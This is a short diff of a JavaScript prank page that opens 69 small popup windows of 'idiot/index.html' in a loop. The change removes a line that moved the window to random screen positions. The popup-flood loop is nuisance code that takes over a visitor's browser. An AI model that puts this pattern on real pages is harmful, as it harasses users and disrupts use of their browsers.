@@ -8,7 +8,6 @@ function setWindow() {
 function openWindow() {
   for (let i = 0; i < 69; i++) {
   	window.open("idiot/index.html", "_blank", "resizable=no,width=200,height=100");
-  	window.moveTo(randomRange(0, screen.width), randomRange(0, screen.height));
   }
 }
 function moveWindowLoop() {
